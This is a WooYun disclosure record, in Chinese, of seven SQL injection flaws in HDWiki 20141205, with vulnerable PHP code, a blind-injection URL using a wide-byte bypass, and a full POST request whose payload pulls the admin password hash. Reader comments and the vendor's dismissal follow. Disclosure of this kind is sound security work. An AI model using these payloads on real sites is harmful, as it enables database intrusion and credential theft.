{"id": 45102, "wybug_id": "wooyun-2014-088004", "wybug_title": "Hdwiki (20141205) 存在7处SQL注入漏洞（含之前处理不当安全的漏洞）", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "′雨。", "wybug_date": "2014-12-22 19:26", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 看到更新了, 有几个老洞还没修复 也随便放到这里面来说了。 详细说明：  0x01 在control/comment.php 中\nfunction doreport(){\t\t$usernames=array();\t\t$id=intval($this->post['id']) ? $this->post['id'] : 0;\t\t$report=trim(htmlspecialchars(WIKI_CHARSET==GBK?string::hiconv($this->post['report']):$this->post['report']));\t\tif(empty($id)||empty($report)){\t\t\t$this->message(-1,'',2);\t\t}\t\t$users=$_ENV[\"user\"]->get_users('groupid',4);\t\tif(!(bool)$users){\t\t\t$this->message(-2,'',2);\t\t}else{\t\t\tforeach($users as $user){\t\t\t\t$usernames[]=$user['username'];\t\t\t}\t\t}\t\t$sendto=join(',',$usernames);\t\t$subject=$this->view->lang['commentReportObj'];\t\tif($this->user['uid']=='0'){\t\t\t$from=$this->ip;\t\t}else{\t\t\t$from=$this->user['username'];\t\t}\t\t$comment=$this->db->fetch_by_field('comment','id',$id);// 这里出了个裤。\t\t\t\tif(!(bool)$comment){\t\t\t$this->message(-1,'',2);\t\t}\t\t\t$doc=$this->db->fetch_by_field('doc','did',$comment['did']);\t\t$doc['title'] =htmlspecialchars(stripslashes($doc['title']));\t\t$report=$this->view->lang['commentCom'].$this->view->lang['commentUser'].$comment['author'].'<br/>'\t\t\t\t.$this->view->lang['commentCom'].$this->view->lang['commentTime'].$this->date($comment['time']).\"<br/>\"\t\t\t\t.$this->view->lang['commentId'].$comment['id'].'<br/>'.$this->view->lang['commentsDocTitle'].$doc['title'].\"<br/>\"\t\t\t\t.$this->view->lang['commentContent'].$comment['comment'].'<br/>'\t\t\t\t.$this->view->lang['commentReportReason'].$report;//这里把出库的$comment写到了$report中\t\t$sendarray = array(\t\t\t\t'sendto'=>$sendto,\t\t\t\t'subject'=>$subject,\t\t\t\t'content'=>$report,//带入数组\t\t\t\t'isdraft'=>1,\t\t\t\t'user'=>$this->user\t\t\t);\t\t$_ENV['pms']->send_ownmessage($sendarray);\n\nfunction send_ownmessage($sendarray){\t\t$pmsresult = true;\t\t$isdraft = ($sendarray['isdraft'] === 'on')? 1 : 0;\t\t$userinfo = $this->check_recipient($sendarray['sendto'],1);\t\t$num = count($userinfo);\t\tif($num > 0){\t\t\t$pmsquery = \"INSERT INTO \".DB_TABLEPRE.\"pms (`from`,`fromid`,`drafts`,`toid`,`to`,`subject`,`message`,`time`,`new`) VALUES \";\t\t\tfor($i=0; $i<$num; $i++){\t\t\t\t$pmsquery .= \"('\".$sendarray['user']['username'].\"','\".$sendarray['user']['uid'].\"','\".$isdraft.\"','\".$userinfo[$i]['uid'].\"','\".$userinfo[$i]['username'].\"','\".$sendarray['subject'].\"','\".$sendarray['content'].\"','\".$this->base->time.\"',1),\";\t//无过滤 又直接带入到了insert当中\t\t\t}\t\t\t$pmsquery = substr($pmsquery,0,-1) . ';';\t\t\t$pmsresult = $this->db->query($pmsquery);\t\t}\t\treturn $pmsresult;\t}\n\n词条的评论（共1条）返回词条xiaoyu 时间：12-19 00:47test'//我们随便找一个词条 然后我们自己先去评论一条 这里评论了test'     // 然后点击举报 看看执行的语句  INSERT INTO wiki_pms (`from`,`fromid`,`drafts`,`toid`,`to`,`subject`,`message`,`time`,`new`) VALUES ('xiaoyu','2','0','1','admin','评论举报专用','评论作者：xiaoyu<br/>评论时间：12-19 00:47<br/>评论ID：8<br/>评论词条名：xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd<br/>评论内容：test'<br/>举报原因teet','1418921320',1) 评论内容：test' 这里出库了。\n 这里的怎么回显让我纠结了很久。INSERT INTO wiki_pms (`from`,`fromid`,`drafts`,`toid`,`to`,`subject`,`message`,`time`,`new`) VALUES ('xiaoyu','2','0','1','admin','评论举报专用','评论作者：xiaoyu<br/>评论时间：12-19 00:47<br/>评论ID：8<br/>评论词条名：xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd<br/>评论内容：test'<br/>举报原因teet','1418921320',1) 这里会把我们的message的内容回显出来,在发送邮件的那里。 这里是发给了管理员 但是我们的发件箱可以看到。 后面还剩了一个time 和 new 都是不会显示出来的而且hdwiki没mysql error 所以不会报错。二次注入的话盲注会很麻烦,所以像办法直接出数据。INSERT INTO wiki_pms (`from`,`fromid`,`drafts`,`toid`,`to`,`subject`,`message`,`time`,`new`) VALUES ('xiaoyu','2','0','1','admin','评论举报专用','评论作者：xiaoyu<br/>评论时间：12-19 00:47<br/>评论ID：8<br/>评论词条名：a<br/>评论内容：test'+123,1,1)#<br/>举报原因teet','1418921320',1) 评论内容：test'+123  mysql +不能连接字符串 只能加一个数字。 加字符是加不进去的一开始是想的hex 但是hex 也会有字符。 然后就是想的把16进制转换成10进制10进制就没数字了撒  然后完整的就是\n\n举报后 进入自己的发件箱 标题 \t收件人 \t时间\t评论举报专用 \tadmin \t01-01 08:001919905652 转发  删除  关闭可以看到这样的发件的。 看 1919905652 这个转16进制 得726f6f74 然后加上0x726f6f74再把HEX编码回来 得root   这样一次截取的字符不能太多 太多了数字太大会报错。0x02 control/doc.php\nfunction docheckrecipient(){\t\t$sendto = $this->post['sendto'];\t\tif (WIKI_CHARSET == 'GBK'){\t\t\t$sendto = string::hiconv($sendto,'GBK','UTF-8',1);//转码\t\t}\t\t$send = explode(',',$sendto);\t\tif(count($send)>10){\t\t\t$this->message($this->view->lang['fullsend'],'',2);\t\t}\t\t$checkreturn = $_ENV['pms']->check_recipient($sendto,0);\t\t$message = ($checkreturn === true)? 'OK' : ($checkreturn.' '.$this->view->lang['loginTip3']);\t\t$this->message($message,'',2);\t}\n\nfunction hiconv($str,$to='',$from='',$force=false) {\t\tif (empty($str)) return $str;\t\tif(!preg_match( '/[\\x80-\\xff]/', $str)) return $str; // is contain chinese char\t\tif(empty($to)){\t\t\tif ('utf-8' == strtolower(WIKI_CHARSET)){\t\t\t\treturn $str;\t\t\t}\t\t\t$to=WIKI_CHARSET;\t\t}\t\tif(empty($from)){\t\t\t$from = ('gbk'==strtolower($to)) ? 'utf-8':'gbk';\t\t}\t\t$to=strtolower($to);\t\t$from=strtolower($from);\t\t//$isutf8=preg_match( '/^([\\x00-\\x7f]|[\\xc0-\\xdf][\\x80-\\xbf]|[\\xe0-\\xef][\\x80-\\xbf]{2}|[\\xf0-\\xf7][\\x80-\\xbf]{3})+$/', $str );\t\t$re = strlen($str) > 6 ? '/([\\xe0-\\xef][\\x80-\\xbf]{2}){2}/' : '/[\\xe0-\\xef][\\x80-\\xbf]{2}/';\t\t$isutf8 = preg_match($re, $str);\t\t//$force = (substr($to, 0, 3) == 'utf') ? true : $force;\t\tif(!$force && $isutf8 && $to=='utf-8' ) return $str;//当force为1的时候才不会return 这里的点force刚好为1\t\tif(!$force && !$isutf8 && $to=='gbk' ) return $str;\t\tif (function_exists('iconv')){\t\t\t$str = iconv($from, $to, $str);//转码 宽字节 绕过转义符\t\t}else{\t\t\trequire_once(HDWIKI_ROOT.'/lib/Chinese.class.php');\t\t\t$ch = new chinese($from,$to);\t\t\tif('utf-8'==$from){\t\t\t\t$str = addslashes($ch->convert(stripslashes($str)));\t\t\t}else{\t\t\t\t$str = $ch->convert($str);\t\t\t}\t\t}\t\treturn $str;\t}\n\nfunction check_recipient($sendto, $type){\t\t$userinfos = array();\t\t$send = array_unique(explode(',', $sendto));//这里把逗号替换了 注定不能用逗号了。\t\tsort($send);\t\t$num = count($send);\t\t$sendto = str_replace(\",\", \"','\", $sendto);\t\t$query = $this->db->query(\"SELECT username,uid FROM \".DB_TABLEPRE.\"user WHERE username IN ('$sendto')\");\t\tif($this->db->num_rows($query) == $num && $type != 1){\t\t\treturn true;\t\t}\n盲注之。http://web/dan/hdwiki//index.php?pms-checkrecipientsendto=a%E9%8C%A6%27) or CASE WHEN(substr((select username from wiki_user where uid=1) from 1 for 1) in (char(97))) THEN (1) ELSE (0) end limit 1#//bypass逗号的盲注语句。97对应的是a 当第一位是a的时候 返回ok\n\n\n\n当不对应时 直接错误。 写个脚本直接跑 很简单的判断。 0x03 control/doc.php中\nfunction dochangename(){\t\t$ajaxtitle = trim($this->post['newname']);\t\tif(string::hstrtoupper(WIKI_CHARSET)=='GBK'){\t\t\t$ajaxtitle=string::hiconv($ajaxtitle,'gbk','utf-8','true');//force为1 转码 绕过转义符\t\t}\t\t$title=string::substring(string::stripscript($_ENV['doc']->replace_danger_word(trim($ajaxtitle))),0,80);\t\tif(@!is_numeric($this->post['did'])){\t\t\t$this->message(\"-1\",\"\",2);\t\t}elseif($ajaxtitle!=string::stripscript($ajaxtitle)){\t\t\t$this->message(\"-3\",\"\",2);\t\t}elseif(!$title){\t\t\t$this->message(\"-4\",\"\",2);\t\t}elseif(@(bool)$this->db->fetch_by_field('doc','title',$title)){//这里带入查询\t\t\t$this->message(\"-2\",\"\",2);\t\t}elseif(@(bool)$this->db->fetch_by_field('synonym','srctitle',$title)){\t\t\t$this->message(\"-5\",\"\",2);\t\t}elseif($_ENV['doc']->change_name($this->post['did'],$title)){\t\t\t$_ENV['synonym']->synonym_change_doc($this->post['did'],$title);\t\t\t// ֪ͨ\t\t\tif(1 == $this->setting['cloud_search']) {\t\t\t\t// ༭ ֪ͨ\t\t\t\t$_ENV['search']->cloud_change(array('dids'=>$this->post['did'],'mode'=>'2'));\t\t\t}\n这个跟上个差不多 就不多说了。0x04 control/edition.php\nfunction doremove(){\t\t$did=isset($this->post['did'])?$this->post['did']:$this->get[2];\t\t$eids=isset($this->post['eid'])?$this->post['eid']:array($this->get[3]);//post来\t\tforeach($eids as $eid){ \t\t\tif(!is_numeric($eid)&&!is_numeric($did)){//这里判断是不是数字 如果是不是数字的话 直接返回错误了。 但是这里有个问题是 当$eids为数组的时候才会进foreach 如果不是数组 那么就不会进这个判断 这里我们直接提交一个字符串\t\t\t\t$this->message($this->view->lang['parameterError'],'BACK',0);\t\t\t}\t\t}\t\t\t\t$result=$_ENV['doc']->remove_edition($eids, $did);//带入查询\n\nfunction remove_edition($eid, $did=0){\t\tif(is_array($eid)){\t\t\t$eid=implode(\",\",$eid);\t\t}\t\t$sql=\"INSERT INTO \".DB_TABLEPRE.\"recycle (type,keyword,content,file,adminid,admin,dateline) values \";\t\t$query=$this->db->query(\"SELECT * FROM \".DB_TABLEPRE.\"edition WHERE eid IN ($eid)\");//这里eid没单引号\t\t$delete_count = array();\t\twhile($edition=$this->db->fetch_array($query)){\n\n\n0x05 依旧control/edition.php\nfunction doexcellent(){\t\tforeach(@$this->post['eid'] as $eid){\t\t\tif(!is_numeric($eid)){//一样的逻辑错误\t\t\t\t$this->message($this->view->lang['parameterError'],'BACK',0);\t\t\t}\t\t}\t\t\t$result=$_ENV['doc']->set_excellent_edition($this->post['eid']);\n\nfunction set_excellent_edition($eid,$type=1){\t\tif(is_array($eid)){\t\t\t$eid=implode(\",\",$eid);\t\t}\t\t$type=(bool)$type?1:0;\t\t$this->db->query(\"UPDATE \".DB_TABLEPRE.\"edition SET excellent=$type WHERE eid IN ($eid)\");//依旧没单引号 可注入\t\treturn true;\n跟上面个差不多 不多说了。0x06 control/doc.php中\nfunction docreate(){\t\tif(4 != $this->user['groupid'] && ($this->time-$this->user['regtime'] < $this->setting['forbidden_edit_time']*60)){\t\t\t$this->message($this->view->lang['editTimeLimit1'].$this->setting['forbidden_edit_time'].$this->view->lang['editTimeLimit2'],'BACK',0);\t\t}\t\tif($this->setting['verify_doc'] == -1) { //首次编辑审核\t\t\tif($this->setting['max_newdocs'] != 0 && $this->user['newdocs'] >= $this->setting['max_newdocs']) {\t\t\t\t$this->message('您的首次可创建或编辑词条数的数量已达最大值,请等待管理员审核', 'BACK', 0);\t\t\t}\t\t}if($this->setting['checkcode']!=3 && $this->setting['doc_verification_create_code'] && strtolower($this->post['code'])!=$_ENV['user']->get_code()){\t\t\t\t$this->message($this->view->lang['codeError'],'BACK',0);\t\t\t}\t\t\tif(@trim($this->post['content'])==''||@trim($this->post['title'])==''){\t\t\t\t$this->message($this->view->lang['contentIsNull'],'BACK',0);\t\t\t}\t\t\t$doc['title']=string::substring(string::stripscript($_ENV['doc']->replace_danger_word(trim($this->post['title']))),0,80);//这里关键点 对POST来的截取了字符 这里大概的意思是 假如说一段代码截取4个字符 那么我们就提交一个aaa' 然后转义成aaa\\' 截取字符后就是aaa\\ 这里同理\t\t\t\t\t$_doc=$this->db->fetch_by_field('doc','title',$doc['title']);\t\t\tif((bool)$_doc && !empty($_doc['content'])){\t\t\t\t$this->message($this->view->lang['createDocTip5'],'BACK',0);\t\t\t}\t\t\tif(!(bool)$_ENV['category']->vilid_category($this->post['category'])){\t\t\t\t$this->message($this->view->lang['categoryNotExist'],'BACK',0);\t\t\t}\t\t\tif((bool)$this->post['summary']){\t\t\t\t$doc['summary']=trim(strip_tags($_ENV['doc']->replace_danger_word($this->post['summary'])));\t\t\t}\t\t\t$doc['did']=intval($this->post['did']);\t\t\t$doc['letter']=string::getfirstletter($this->post['title']);\t\t\t$doc['category']=$this->post['category'];\t\t\t//$doc['tags']=$_ENV['doc']->jointags($this->post['tags']);\t\t\t$doc['tags']=$this->post['tags'];\t\t\t$doc['tags']=$_ENV['doc']->replace_danger_word($doc['tags']);\t\t\t$doc['tags'] = htmlspecialchars(string::stripscript($doc['tags']));\t\t\t\t\t\t$doc['content'] = $_ENV['doc']->replace_danger_word($this->post['content']);\t\t\t$doc['content'] = preg_replace('/(<embed.*?(?:allowscriptaccess)=)\\\\\\?([\\'\"]?)(\\w*?)\\\\\\?\\2(.*?>)/i','$1$2never$2$4',$doc['content']);//将embed标签中的allowscriptaccess属性设置为never\t\t\t$doc['content'] = preg_replace('/(<embed(?:(?!allowscriptaccess).)+?)(>)/i','$1 allowscriptaccess=\"never\" $2',$doc['content']);//将embed标签中如果不存在allowscriptaccess属性则添加属性并设为never\t\t\t$doc['content'] = addslashes(string::stripscript(stripslashes($doc['content'])));\t\t\t$doc['content'] = $this->setting['auto_picture']?$_ENV['doc']->auto_picture($doc['content'],$doc['did']):$doc['content'];\t\t\t$doc['summary'] = trim(strip_tags($_ENV['doc']->replace_danger_word($doc['summary'])));//去除敏感词\t\t\t$doc['summary'] = (bool)$doc['summary']?$doc['summary']:$doc['content'];\t\t\t$doc['summary'] = trim(string::convercharacter(string::substring(strip_tags($doc['summary']),0,100)));//去除换行符截断字符串\t\t\t$doc['summary'] = htmlspecialchars(addslashes(stripslashes(string::stripscript(strip_tags($doc['summary'])))));//去除特殊字符 去除javascript代码\t\t\t$doc['images']=util::getimagesnum($doc['content']);\t\t\t$doc['time']=$this->time;\t\t\t$doc['words']=string::hstrlen($doc['content']);\t\t\t$doc['visible']=$this->setting['verify_doc'] != 0 ? '0' : '1';      \t\t\tif(strpos($this->user['regulars'], 'doc-immunity') === false && 4 != $this->user['groupid']) {\t\t\t\tif(!$_ENV['doc']->check_submit_interval($this->user['uid'])) {\t\t\t\t\tif($this->setting['save_spam']) {\t\t\t\t\t\t$doc['visible'] = 0;\t\t\t\t\t} else {\t\t\t\t\t\t$this->message(sprintf($this->view->lang['submit_interval_msg'], $this->setting['submit_min_interval']),\"BACK\",0);\t\t\t\t\t}\t\t\t\t}\t\t\t\tif(!$_ENV['doc']->check_eng_pcnt($doc['content']) || !$_ENV['doc']->check_extlink_pcnt($doc['content'])) {\t\t\t\t\tif($this->setting['save_spam']) {\t\t\t\t\t\t$doc['visible'] = 0;\t\t\t\t\t} else {\t\t\t\t\t\t$this->message($this->view->lang['spam_msg'],\"BACK\",0);\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\tif(strpos($this->user['regulars'], 'doc-immunity') !== false || 4 == $this->user['groupid'] || !$this->setting['verify_doc'] || ($this->setting['verify_doc'] == -1 && $this->user['newdocs'] == -1)){\t\t\t\t$doc['visible'] = 1;\t\t\t}\t\t\tif($this->setting['verify_doc'] == -1) { //首次编辑审核\t\t\t\tif($this->user['newdocs'] != -1) {\t\t\t\t\t$_ENV['user']->update_newdocs($this->user['uid'], +1);\t\t\t\t}\t\t\t}\t\t\tif($doc['visible'] == 1){\t\t\t\t$_ENV['user']->add_credit($this->user['uid'],'doc-create',$this->setting['credit_create'],$this->setting['coin_create']);\t\t\t}\t\t\t/*foreach($this->post['tags'] as $search_tags){\t\t\t\t$doc['search_tags'] .=string::convert_to_unicode($search_tags).\";\";\t\t\t}*/\t  \t\t\t$did=$_ENV['doc']->add_doc($doc);//这里这里 带入入库入库了。\t\t\t$_ENV['user']->update_field('creates',$this->user['creates']+1,$this->user['uid']);\t<code>function add_doc($doc) {\t\t$editions = ($this->base->setting['base_createdoc']==1)?1:0;\t\t$doc['title'] = trim($doc['title']);\t\t\tif ($doc['did']){\t\t\t\t$this->db->query(\"REPLACE INTO \".DB_TABLEPRE.\"doc\t\t\t(did,letter,title,tag ,summary ,content,author,authorid,time,lastedit,lasteditor,lasteditorid,visible,editions)\t\t\tVALUES (\".$doc['did'].\",'\".$doc['letter'].\"','\".$doc['title'].\"','\".$doc['tags'].\"','\".$doc['summary'].\"','\".$doc['content'].\"',\t\t\t'\".$this->base->user['username'].\"','\".$this->base->user['uid'].\"',\t\t\t\".$doc['time'].\",\".$doc['time'].\",'\".$this->base->user['username'].\"','\".$this->base->user['uid'].\"','\".$doc['visible'].\"',$editions)\");\t\t\t$did = $doc['did'];\t\t\t$this->db->query(\"DELETE FROM \".DB_TABLEPRE.\"autosave WHERE did=\".$did.\" AND uid=\".$this->base->user['uid']);\t\t}else{\t\t\t$this->db->query(\"INSERT INTO \".DB_TABLEPRE.\"doc\t\t\t(letter,title,tag ,summary ,content,author,authorid,time,lastedit,lasteditor,lasteditorid,visible,editions)\t\t\tVALUES ('\".$doc['letter'].\"','\".$doc['title'].\"','\".$doc['tags'].\"','\".$doc['summary'].\"','\".$doc['content'].\"',\t\t\t'\".$this->base->user['username'].\"','\".$this->base->user['uid'].\"',\t\t\t\".$doc['time'].\",\".$doc['time'].\",'\".$this->base->user['username'].\"','\".$this->base->user['uid'].\"','\".$doc['visible'].\"',$editions)\");\t\t\t$did = $this->db->insert_id();\t\t\t$this->add_doc_category($did, $doc['category']);\t\t\t$this->db->query(\"DELETE FROM \".DB_TABLEPRE.\"autosave WHERE did=\".$did.\" AND uid=\".$this->base->user['uid']);\t\t}\t\tif($this->base->setting['base_createdoc']==1){\t\t\t$this->db->query(\"INSERT INTO \".DB_TABLEPRE.\"edition\t\t\t(did,author,authorid,time,ip,title,tag,summary,content,words,images )\t\t\tVALUES ($did,'\".$this->base->user['username'].\"','\".$this->base->user['uid'].\"',\t\t\t'\".$doc['time'].\"','\".$this->base->ip.\"','\".$doc['title'].\"','\".$doc['tags'].\"','\".$doc['summary'].\"','\".$doc['content'].\"','\".$doc['words'].\"','\".$doc['images'].\"')\");\t\t}\t\treturn $did;\t}\n $doc['title'].\"','\".$doc['tags'] 刚好这截取字符的 后面跟的是一个post来的 那么就可以注入了。 后面看了下 这个洞竟然被提交过了   WooYun: hdwiki  sql注射漏洞 但是我觉得xxx牛给的利用很不完美啊。 至少在我这个版本/* 是不成功的在php中/* 能直接注释掉后面的东西 但是mysql很多版本都需要在后面接*/才能注释掉一开始我也在这语句上纠结了很久 我们先来看一下这个语句REPLACE INTO wiki_doc\t\t\t(did,letter,title,tag ,summary ,content,author,authorid,time,lastedit,lasteditor,lasteditorid,visible,editions)\t\t\tVALUES (56,'x','xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd\\',',user(),1,1,1,1,1,1,1,1#','asd','<p>asd<br /></p>',\t\t\t'xiaoyu','2',\t\t\t1418925356,1418925356,'xiaoyu','2','1',0)是这样的 他换行了。 就是因为这个换行 让人蛋疼。首先我们知道# -- 都是单行注释 这个多行注释/* 在mysql中又需要接*/后面的我们是不可控的 所以也没办法利用 这里我们还是得来接我们的单行注释一共14个column 换行了后的有8个column 所以我们前面需要接6个column56,'x','xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd\\',' 这里是三个 所以我们构造一下56,'x','xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd\\',',1,1,1  这样就是6个了。  在1后面还需要构造一个, 为的就是和下面换行了的连接起来  然后再注释掉这一行后面的那么最终语句就是REPLACE INTO wiki_doc\t\t\t(did,letter,title,tag ,summary ,content,author,authorid,time,lastedit,lasteditor,lasteditorid,visible,editions)\t\t\tVALUES (56,'x','xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd\\',',concat(user(),0x23,version()),user(),(select concat(username,0x2c,password) from wiki_user where uid=1),#','asd','<p>asd<br /></p>',\t\t\t'xiaoyu','2',\t\t\t1418925356,1418925356,'xiaoyu','2','1',0)\nPOST /dan/hdwiki/index.php?doc-create HTTP/1.1Host: webUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveReferer: http://web/dan/hdwiki/index.php?doc-createCookie: ECS[visit_times]=6; themeIndexTom=2; KT-GUID=KT-C3DD75C5698EA55255357D6602C6136C; KT-ADMIN=admin; 17cplastvisit=1418373539; 17cplastactivity=0; __utma=242480388.119574638.1418373557.1418373557.1418373557.1; __utmz=242480388.1418373557.1.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none); hd_sid=7YD9xP; hd_auth=b37eKa64aWjTOOSABPRfh3bnxRh50jO7TfArgwNT1RGI1HzWq11B2XSpwCG%2BKaHUwNFm9NRHXZ2nR5JUNbvWContent-Type: multipart/form-data; boundary=---------------------------41184676334Content-Length: 1534-----------------------------41184676334Content-Disposition: form-data; name=\"did\"56-----------------------------41184676334Content-Disposition: form-data; name=\"section_id\"-----------------------------41184676334Content-Disposition: form-data; name=\"create_submit\"1-----------------------------41184676334Content-Disposition: form-data; name=\"title\"xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxasd\\-----------------------------41184676334Content-Disposition: form-data; name=\"category\"3-----------------------------41184676334Content-Disposition: form-data; name=\"content\"<p>asd<br /></p>-----------------------------41184676334Content-Disposition: form-data; name=\"letter\"asd-----------------------------41184676334Content-Disposition: form-data; name=\"tags\",concat(user(),0x23,version()),user(),(select concat(username,0x2c,password) from wiki_user where uid=1),#-----------------------------41184676334Content-Disposition: form-data; name=\"code\"-----------------------------41184676334Content-Disposition: form-data; name=\"publishsubmit\"·à2?-----------------------------41184676334--Content-Disposition: form-data; name=\"tags\",user(),user(),user(),user(),1,1,1,1,1,1,1)#-----------------------------491299511942Content-Disposition: form-data; name=\"code\"-----------------------------491299511942Content-Disposition: form-data; name=\"publishsubmit\"·à2?-----------------------------491299511942--\n成功执行。  \n\n直接出数据。0x07 control/pms.php中\nfunction doblacklist(){\t\tif(isset($this->post['blacklist'])){\t\t\t$blacklist = htmlspecialchars(string::stripscript($this->post['blacklist']));\t\t\tif(empty($blacklist)){\t\t\t\t$result = $_ENV['pms']->remove_blacklist($this->user['uid']);\t\t\t}else{\t\t\t\t$result = $_ENV['pms']->add_blacklist($blacklist,$this->user['uid']);\n\nfunction add_blacklist($blacklist,$uid){\t\treturn($this->db->query(\"REPLACE INTO \".DB_TABLEPRE.\"blacklist (uid,blacklist) VALUES('$uid','$blacklist')\"));\t}//入库\n\nfunction dobox(){\t\t$this->get[3] = empty($this->get[3]) ? NULL : $this->get[3];\t\t$page = max(1,isset($this->get[4]) ? $this->get[4] : $this->get[3]);\t\t$num = isset($this->setting['list_prepage'])?$this->setting['list_prepage']:20;\t\t$start_limit = ($page - 1) * $num;\t\t\t\t$count = $_ENV['pms']->get_totalpms($this->user['uid'], $this->get[2]);//出库\n\nfunction get_blacklist($uid){\t\t$user = $this->db->fetch_first(\"SELECT blacklist FROM \".DB_TABLEPRE.\"blacklist WHERE uid='\".$uid.\"'\");\t\treturn $user['blacklist'];\n\n$blackuser = str_replace(\",\",\"','\",$blacklist);\t\t\t\t\t\tif($group){\t\t\t\t\t$sqladd = ($group == 'owner') ? 'AND og=0' : 'AND og=1';\t\t\t\t}\t\t\t\t$query = \"SELECT COUNT(*) num FROM \".DB_TABLEPRE.\"pms WHERE toid='$uid' AND delstatus!=2 AND drafts!=1 $sqladd AND `from`\n\n\n这个老洞也没修复  WooYun: Hdwiki设计缺陷知邮箱可改密码（包括管理员）  试试修复了把。   漏洞证明：  \n\n   修复方案：  无尽的过滤。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-22 19:27 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  牛！    \n     2014-12-22 19:29 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  大礼包    \n     2014-12-22 19:41 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  屌    \n     2014-12-22 19:47 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  猪猪侠也来了？    \n     2014-12-22 19:53 |    \t\t草榴社区 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:26        | 未满18周岁,不准进入.)\t\t \n  楼主居然没拆成7个...业界良心.    \n     2014-12-22 20:08 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  你关注的白帽子 ′雨。 发表了漏洞 Hdwiki (20141205)     \n     2014-12-22 23:02 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @互动在线（北京）科技有限公司 xwiki是不是你们？    \n     2014-12-22 23:07 |    \t\tgeekfree \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:49        | hello world)\t\t \n  怎么绕过防御的??    \n     2014-12-23 02:03 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  审计哪家强....    \n     2014-12-23 11:24 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n    看最近的状态 要被忽略了  到时候补点rank吧， 写了挺久。。@Finger @疯狗    \n     2014-12-23 11:25 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @geekfree   get才有 post没，    \n     2014-12-23 11:41 |    \t\tgeekfree \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:49        | hello world)\t\t \n  噢，原来如此,get的这种方式能绕过吗?    \n     2014-12-23 11:42 |    \t\tgeekfree \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:49        | hello world)\t\t \n  @′雨。 get的这种方式能绕过吗    \n     2014-12-23 12:37 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @geekfree 结合具体的点把。  不过我感觉一般不行了。    \n     2014-12-23 12:57 |    \t\tgeekfree \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:49        | hello world)\t\t \n  @′雨。 能加个q不:1963103788    \n     2015-01-29 15:42 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  get post都做了防御的啊,求姿势    \n     2015-02-03 14:39 |    \t\thuotoo \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 努力学习中)\t\t \n  这些基本之前都发过了 只有一个 是没发的    \n     2015-02-12 20:55 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  ? 1w : 4k    \n     